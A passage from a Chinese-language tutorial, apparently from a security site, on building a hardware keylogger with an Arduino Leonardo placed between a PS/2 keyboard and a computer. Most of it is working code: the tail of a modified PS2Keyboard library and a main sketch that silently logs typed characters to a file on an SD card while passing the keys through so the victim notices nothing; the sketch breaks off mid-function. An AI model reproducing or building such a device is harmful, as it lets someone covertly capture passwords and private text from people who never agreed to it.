&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(result){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CharBuffer=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result=get_iso8859_code();
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(result&gt;=&nbsp;128)&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(result&gt;=&nbsp;233&nbsp;&amp;&amp;&nbsp;result&nbsp;&lt;=&nbsp;244)&nbsp;//F1-F12的输入判定
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CombinationKey=result;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;UTF8next=(result&nbsp;&amp;&nbsp;0x3F)&nbsp;|&nbsp;0×80;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;result=((result&nbsp;&gt;&gt;&nbsp;6)&nbsp;&amp;&nbsp;0x1F)&nbsp;|&nbsp;0xC0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(!result)&nbsp;return&nbsp;-1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;returnresult;
}
&nbsp;
PS2Keyboard::PS2Keyboard(){
&nbsp;&nbsp;//&nbsp;nothing&nbsp;todohere,&nbsp;begin()&nbsp;does&nbsp;it&nbsp;all
}
&nbsp;
void&nbsp;PS2Keyboard::begin(uint8_tdata_pin,&nbsp;uint8_tirq_pin,&nbsp;constPS2Keymap_t&nbsp;&amp;map)&nbsp;{
&nbsp;&nbsp;uint8_tirq_num=0;
&nbsp;
&nbsp;&nbsp;DataPin&nbsp;=data_pin;
&nbsp;&nbsp;keymap&nbsp;=&amp;map;
&nbsp;
#ifdef&nbsp;INPUT_PULLUP
&nbsp;pinMode(irq_pin,INPUT_PULLUP);
&nbsp;pinMode(data_pin,INPUT_PULLUP);
#else
&nbsp;pinMode(irq_pin,INPUT);
&nbsp;digitalWrite(irq_pin,HIGH);
&nbsp;pinMode(data_pin,INPUT);
&nbsp;digitalWrite(data_pin,HIGH);
#endif
&nbsp;
&nbsp;&nbsp;switch(irq_pin)&nbsp;{
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT0_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT0_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT1_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT1_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;1;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT2_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT2_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT3_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT3_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;3;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT4_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT4_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;4;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT5_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT5_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;5;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT6_PIN
&nbsp;&nbsp;&nbsp;caseCORE_INT6_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;6;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;#ifdefCORE_INT7_PIN
&nbsp;&nbsp;&nbsp;&nbsp;caseCORE_INT7_PIN:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;7;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;#endif
&nbsp;&nbsp;&nbsp;default:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;irq_num&nbsp;=&nbsp;0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;}
&nbsp;&nbsp;head&nbsp;=&nbsp;0;
&nbsp;&nbsp;tail&nbsp;=&nbsp;0;
&nbsp;attachInterrupt(irq_num,ps2interrupt,&nbsp;FALLING);}</pre>
<p><span style="color: rgb(38, 38, 38);"><strong><span id="_baidu_bookmark_start_241" style="display: none; line-height: 0px;">‍</span></strong></span><span id="_baidu_bookmark_start_243" style="display: none; line-height: 0px;">‍</span><span style="color: rgb(38, 38, 38);"><strong>键盘输入的库有了，接下来第二步是将上面所截获的数据存入存储器，arduino自身提供了EEPROM存储器，但是容量仅仅只有1k，这样小的空间显然不能满足我们的要求，但arduino本是就是为扩展各种功能而设计出来的，为此我们为它加入一块sd卡扩展板，将键盘数据存储在sd卡中，这里我选用seeed studio的SD Shield(这种扩展板市面上有很多，只要是支持arduino的，买来都能用)，扩展板的安装极为简单，只需按照针脚位置对接插入，</strong></span>如下图所示:<span id="_baidu_bookmark_end_244" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_242" style="display: none; line-height: 0px;">‍</span></p>
<p style="background: white; text-align: center; line-height: 26px; margin-bottom: 10px;"><img data-original="http://image.3001.net/images/ue/33691423968856.jpg" src="http://www.freebuf.com/buf/themes/freebuf/images/grey.gif"/></p>
<noscript><img src="http://image.3001.net/images/ue/33691423968856.jpg"/></p></noscript>
<p><span id="_baidu_bookmark_start_253" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_255" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_257" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_259" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_261" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_start_263" style="display: none; line-height: 0px;">‍</span>这些为arduino定制的扩展板都有很好的兼容性，所以只要插上，然后用现成的SD卡库开发一段存储程序即可。</p>
<p>接下来是如何将截获的键值发送到计算机的问题，这个问题自从arduino升级到leonardo,官方已经提供了完整的支持(这也是我们的设计基于leonardo的原因)，这个新增的keyboard库可以用很简单的代码模拟键盘向计算机输入数据。</p>
<p>好，现在万事具备，只差一段最后的程序了:<span id="_baidu_bookmark_end_264" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_262" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_260" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_258" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_256" style="display: none; line-height: 0px;">‍</span><span id="_baidu_bookmark_end_254" style="display: none; line-height: 0px;">‍</span></p>
<pre class="prettyprint lang-html">1.&nbsp;&nbsp;
2.&nbsp;/*&nbsp;&nbsp;Name:arduinoPS2键盘记录器程序
3.&nbsp;*&nbsp;&nbsp;Author:b41k3r
4.&nbsp;*&nbsp;&nbsp;Update:2014-01-10
5.&nbsp;&nbsp;
6.&nbsp;*&nbsp;&nbsp;Version:0×06
7.&nbsp;*/&nbsp;&nbsp;&nbsp;
8.&nbsp;#include&lt;PS2Keyboard.h&gt;
9.&nbsp;#include&lt;SD.h&gt;&nbsp;&nbsp;&nbsp;//引用SD卡读写官方库
10.&nbsp;
11.const&nbsp;int&nbsp;DataPin&nbsp;=&nbsp;5;
12.const&nbsp;intIRQpin=&nbsp;&nbsp;3;&nbsp;&nbsp;//设置数据和时钟针脚
13.File&nbsp;RecordFile;&nbsp;&nbsp;&nbsp;//定义文件写入
14.StringrecordTemp=&quot;[Begin]&quot;;//监听的临时参数,每监听到一个键就加在此字符的后面,并设定每次监听的开头为[Begin]
15.PS2Keyboard&nbsp;kbd;&nbsp;&nbsp;//PS2Keyboard&nbsp;类实例化
16.void&nbsp;setup()&nbsp;{
17.&nbsp;&nbsp;Keyboard.begin();//向计算机发送按键信号准备开始
18.&nbsp;&nbsp;kbd.begin(DataPin,IRQpin,PS2Keymap_US);&nbsp;&nbsp;//设置键盘为标准的美国101
19.&nbsp;&nbsp;Serial.begin(9600);
20.&nbsp;&nbsp;pinMode(10,OUTPUT);
21.&nbsp;&nbsp;if(!SD.begin(4))&nbsp;{
22.&nbsp;&nbsp;Serial.println(&quot;Initialization&nbsp;failed!&quot;);
23.&nbsp;&nbsp;}
24.&nbsp;&nbsp;RecordFile=SD.open(&quot;record.txt&quot;,FILE_WRITE);&nbsp;&nbsp;//在SD卡建立文件，准备写入
25.}
26.&nbsp;
27.void&nbsp;loop()&nbsp;{&nbsp;&nbsp;&nbsp;//开始循环监听
28.if&nbsp;(kbd.available())&nbsp;{
29.&nbsp;&nbsp;char&nbsp;c=kbd.readIt();&nbsp;&nbsp;&nbsp;//读取输入的键
30.&nbsp;&nbsp;intCombinationKey&nbsp;=kbd.getCombinationKey();
31.&nbsp;&nbsp;if(c&lt;0)
32.&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;//CombinationKey=2和1代表alt和ctrl两种组合键
33.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(CombinationKey==2)
34.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
35.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.press(KEY_LEFT_ALT);
36.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.press(abs(c));
37.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay(100);
38.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.releaseAll();
39.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if&nbsp;(CombinationKey==1)
40.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
41.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serial.println(abs(c));
42.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.press(KEY_LEFT_CTRL);
43.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.press(abs(c));
44.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay(100);
45.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.releaseAll();
46.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else&nbsp;if(CombinationKey&gt;=233&amp;&amp;CombinationKey&lt;=244)&nbsp;&nbsp;//代表F1-F12
47.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
48.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serial.println(CombinationKey);
49.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(CombinationKey)&nbsp;{
50.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case244:&nbsp;&nbsp;KeyPress(KEY_F1);&nbsp;&nbsp;break;
51.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case243:&nbsp;&nbsp;KeyPress(KEY_F2);&nbsp;&nbsp;break;
52.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case242:&nbsp;&nbsp;KeyPress(KEY_F3);&nbsp;&nbsp;break;
53.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case241:&nbsp;&nbsp;KeyPress(KEY_F4);&nbsp;&nbsp;break;
54.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case240:&nbsp;&nbsp;KeyPress(KEY_F5);&nbsp;&nbsp;break;
55.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case239:&nbsp;&nbsp;KeyPress(KEY_F6);&nbsp;&nbsp;break;
56.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case238:&nbsp;&nbsp;KeyPress(KEY_F7);&nbsp;&nbsp;break;
57.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case237:&nbsp;&nbsp;KeyPress(KEY_F8);&nbsp;&nbsp;break;
58.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case236:&nbsp;&nbsp;KeyPress(KEY_F9);&nbsp;&nbsp;break;
59.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case235:&nbsp;&nbsp;KeyPress(KEY_F10);&nbsp;break;
60.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case234:&nbsp;&nbsp;KeyPress(KEY_F11);&nbsp;break;
61.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;case233:&nbsp;&nbsp;KeyPress(KEY_F12);&nbsp;break;
62.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;break;
63.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
64.&nbsp;
65.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
66.&nbsp;&nbsp;&nbsp;&nbsp;}
67.&nbsp;&nbsp;else{&nbsp;
68.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(c)&nbsp;{&nbsp;&nbsp;//其余的功能键
69.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_ENTER:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_RETURN);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
70.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_TAB:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_TAB);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
71.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_BACKSPACE:KeyPress(KEY_BACKSPACE);break;
72.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_SHIFT:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_LEFT_SHIFT);&nbsp;&nbsp;break;
73.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_ESC:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_ESC);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
74.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_PAGEDOWN:&nbsp;&nbsp;KeyPress(KEY_PAGE_DOWN);&nbsp;&nbsp;&nbsp;break;
75.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_PAGEUP:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_PAGE_UP);&nbsp;&nbsp;&nbsp;&nbsp;break;
76.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_LEFTARROW:&nbsp;&nbsp;KeyPress(KEY_LEFT_ARROW);&nbsp;&nbsp;break;
77.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_RIGHTARROW:KeyPress(KEY_RIGHT_ARROW);&nbsp;break;
78.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_UPARROW:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_UP_ARROW);&nbsp;&nbsp;&nbsp;break;
79.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_DOWNARROW:&nbsp;&nbsp;KeyPress(KEY_DOWN_ARROW);&nbsp;&nbsp;break;
80.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_DELETE:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_DELETE);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
81.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_CAPS_LOCK:&nbsp;&nbsp;KeyPress(KEY_CAPS_LOCK);&nbsp;&nbsp;&nbsp;break;
82.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_HOME:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_HOME);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
83.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_END:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_END);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
84.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;casePS2_INSERT:&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(KEY_INSERT);&nbsp;&nbsp;&nbsp;&nbsp;break;
85.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default:&nbsp;&nbsp;&nbsp;//只有输入字符的时候才开始记录
86.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(recordTemp.length()&gt;27)&nbsp;//为了优化记录速度,recordTemp每截获20个字符才写入record.txt文件一次(包含了开头的[Begin],所以是27),这个值可以任意设置
87.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
88.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(RecordFile)
89.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
90.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recordTemp.concat(&quot;[End]&quot;);
91.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RecordFile.println(recordTemp);
92.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RecordFile.close();
93.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serial.println(&quot;Writing&nbsp;tofiledone.&quot;);&nbsp;//到达20个字符后保存并关闭文件
94.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;else&nbsp;{
95.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Serial.println(&quot;Error&nbsp;writingfile.&quot;);
96.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
97.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recordTemp=&quot;[Begin]&quot;;&nbsp;//保存后重新打开,开始下一轮记录,recordTemp值复位
98.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RecordFile=SD.open(&quot;record.txt&quot;,&nbsp;FILE_WRITE);
99.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}else
100.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
101.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;recordTemp.concat(c);&nbsp;&nbsp;//如果不满20个字符,则将记录的键加入recordTemp之后
102.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
103.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;KeyPress(c);&nbsp;&nbsp;//监听完后把按键信号发送到计算机
104.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
105.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
106.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
107.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
108.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;void&nbsp;KeyPress(charc)&nbsp;&nbsp;//按键函数
109.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
110.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Keyboard.press(c);
111.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;delay(50);
